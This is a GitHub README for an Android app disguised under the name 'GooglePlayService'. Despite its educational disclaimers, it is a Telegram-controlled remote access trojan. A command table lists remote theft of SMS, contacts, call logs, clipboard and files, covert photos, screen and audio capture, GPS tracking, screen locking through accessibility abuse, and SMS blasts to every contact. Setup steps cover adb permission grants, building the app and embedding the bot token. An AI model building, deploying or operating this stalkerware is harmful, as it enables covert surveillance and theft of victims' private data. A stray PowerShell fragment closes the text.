
# GooglePlayService.apk

<img width="1200" height="672" alt="Android Security Research" src="https://github.com/user-attachments/assets/83bbb471-1d57-4597-a91c-e2683b880b07" />

> **Android Security Research & Educational Project**

GooglePlayService.apk is an Android-based security research project created for educational purposes and experimentation with Android background services, system events, accessibility APIs, and Telegram-based communication.

The project demonstrates how an Android application can interact with different Android system components and provides a practical environment for studying Android application security and reverse engineering.

## Disclaimer

This project is intended **strictly for educational, research, and authorized security-testing purposes**.

Do not install, deploy, or use this software on devices that you do not own or do not have explicit permission to test.

The author is not responsible for any misuse, damage, data loss, privacy violations, or unauthorized activity resulting from this project.

## Features

* Android background service architecture
* Boot-time service initialization (BootReceiver)
* Telegram Bot API integration for remote communication
* Android Accessibility API experimentation
* MediaProjection-based screen capture
* Camera2 API photo capture (front + back)
* MediaRecorder audio recording
* Location tracking via GPS
* SMS, Contacts, and Call Log access
* Battery, WiFi, and Device info collection
* Accessibility-based screen lock
* Clipboard access
* File system browser
* Foreground service with persistent notification
* Event and system-service handling
* Android application security research
* Reverse-engineering and malware-analysis study

## Available Commands

Send these commands to your Telegram bot. Send /menu to see the list.

| Command | Description | Permission Required |
|---------|-------------|---------------------|
| /contacts | Get contacts list | READ_CONTACTS |
| /sms | Get inbox SMS (last 30) | READ_SMS |
| /outbox | Get sent SMS (last 30) | READ_SMS |
| /sendsms number\|message | Send SMS to a number | SEND_SMS |
| /sendsmsall message | Send SMS to all contacts | READ_CONTACTS + SEND_SMS |
| /vibrate | Vibrate device for 2 seconds | VIBRATE |
| /apps | List installed applications | - |
| /devices | Show device info (model, Android version) | - |
| /screen | Capture screen (shows MediaProjection dialog) | MediaProjection |
| /location | Get GPS location + Google Maps link | ACCESS_FINE_LOCATION |
| /camera | Take photo with back camera | CAMERA |
| /cameraF | Take photo with front camera | CAMERA |
| /mic | Record 10 seconds of audio | RECORD_AUDIO |
| /calllog | Get call history | READ_CALL_LOG |
| /files path | List files in a directory | READ_EXTERNAL_STORAGE |
| /clipboard | Show clipboard content | - |
| /battery | Battery level, temperature, voltage | - |
| /lock | Lock the screen | Accessibility ON |
| /wifi | WiFi SSID, IP, signal strength | ACCESS_WIFI_STATE |

### Usage Examples

Send SMS:
/sendsms 0771234567|Hello from agent

Bulk SMS to all contacts:
/sendsmsall Test message

List files in a specific folder:
/files /sdcard/Download
/files /storage/emulated/0/DCIM

Screen capture:
/screen

A MediaProjection permission dialog will appear on the device. Tap Allow to send the screenshot.

Front camera photo:
/cameraF

Screen lock:
/lock

Requires Accessibility Service to be enabled: Settings > Accessibility > System Service > ON

## Research Areas

* Android Services (Foreground, Accessibility, Background)
* Broadcast Receivers (BOOT_COMPLETED)
* Accessibility Services API
* Android Permission Model (Runtime, Restricted, AppOps)
* MediaProjection API & VirtualDisplay
* Camera2 API
* MediaRecorder API
* Background execution limits
* Telegram Bot API integration
* APK analysis and DEX decompilation
* Android reverse engineering
* Mobile application security

## Security Considerations

Applications that use permissions such as SMS, contacts, accessibility, or background execution can access sensitive information.

For security research, always test inside an isolated environment such as an emulator or a dedicated test device.

Never store real API tokens, passwords, private keys, or other credentials directly inside an APK. Anything embedded inside an Android application may potentially be extracted through reverse engineering.

### Android 11+ Restricted Permissions

The following permissions require ADB grant:

adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS
adb shell pm grant com.thunderx.telegramagent android.permission.SEND_SMS
adb shell pm grant com.thunderx.telegramagent android.permission.RECEIVE_SMS
adb shell pm grant com.thunderx.telegramagent android.permission.READ_CALL_LOG

Other required permissions:

adb shell pm grant com.thunderx.telegramagent android.permission.READ_CONTACTS
adb shell pm grant com.thunderx.telegramagent android.permission.CAMERA
adb shell pm grant com.thunderx.telegramagent android.permission.RECORD_AUDIO
adb shell pm grant com.thunderx.telegramagent android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.thunderx.telegramagent android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.thunderx.telegramagent android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.thunderx.telegramagent android.permission.WRITE_EXTERNAL_STORAGE
adb shell pm grant com.thunderx.telegramagent android.permission.POST_NOTIFICATIONS

## Building

Clone the repository:

git clone https://github.com/Jayasankha-dev/GooglePlayService.apk
cd GooglePlayService.apk

Create local.properties in the project root:

sdk.dir=C\:\\Users\\<YourUser>\\AppData\\Local\\Android\\Sdk

Build:

./gradlew assembleDebug

On Windows:

gradlew.bat assembleDebug

The generated APK will be located at:

app/build/outputs/apk/debug/app-debug.apk

Install on a connected device:

adb install -r app/build/outputs/apk/debug/app-debug.apk

## Configuration

Before building, edit TelegramAgentService.java and set your bot credentials:

private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
private static final String CHAT_ID   = "YOUR_CHAT_ID_HERE";

Get a bot token from @BotFather on Telegram. Get your chat ID by visiting:

https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates

Look for "chat": { "id": <number> } in the response.

Never commit real tokens to a public repository.

## Recommended Testing Environment

* Android Emulator (with Google APIs)
* Dedicated test device (not your primary phone)
* Test Telegram bot
* Test accounts and dummy data
* Network monitoring tools (Wireshark, mitmproxy)
* APK analysis tools such as JADX, Apktool, Bytecode Viewer
* MobSF (Mobile Security Framework)

## Permissions Used

Network & System:
INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CHANGE_WIFI_STATE, WAKE_LOCK, FOREGROUND_SERVICE, FOREGROUND_SERVICE_MEDIA_PROJECTION, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE, FOREGROUND_SERVICE_LOCATION, RECEIVE_BOOT_COMPLETED

Sensitive:
READ_CONTACTS, READ_SMS, SEND_SMS, RECEIVE_SMS, READ_CALL_LOG, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_AUDIO, READ_MEDIA_VIDEO, POST_NOTIFICATIONS, VIBRATE, BIND_ACCESSIBILITY_SERVICE

## Responsible Disclosure

If you discover a security vulnerability or accidentally expose credentials while working with this project, do not publish the sensitive information. Immediately revoke exposed credentials and replace them with new ones.

## License

This project is licensed under the MIT License.

See LICENSE for details.

## Author

Jayasankha-dev

GitHub: https://github.com/Jayasankha-dev

For educational and authorized security research only.
'@ | Out-File -FilePath README.md -Encoding UTF8
